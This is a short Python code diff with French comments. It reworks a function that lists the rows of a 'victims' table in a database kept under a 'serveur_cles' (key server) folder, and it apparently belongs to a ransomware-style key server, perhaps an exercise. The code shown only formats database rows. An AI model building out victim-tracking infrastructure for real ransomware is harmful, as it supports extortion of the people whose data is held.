@@ -7,18 +7,19 @@ DB_FILENAME = '../serveur_cles/data/victims.sqlite'
 
 def list_victim():
     # Connection DB
-    victim_list = []
     conn = sqlite3.connect(DB_FILENAME)
     c = conn.cursor()
-
+    victim_list = ""
     c.execute('SELECT * FROM victims')
 
     # récupération des résultats
     rows = c.fetchall()
 
-    # affichage des résultats
     for row in rows:
-        victim_list += [row]
+        victim_list += '{0:2} {1:3} {2:4} {3:5} {4:6} \n'.format(str(row[0]), str(row[1]), str(row[2]), str(row[3]), str(row[4]))
+
+    # affichage des résultats
+
     conn.commit()
     conn.close()
     return victim_list
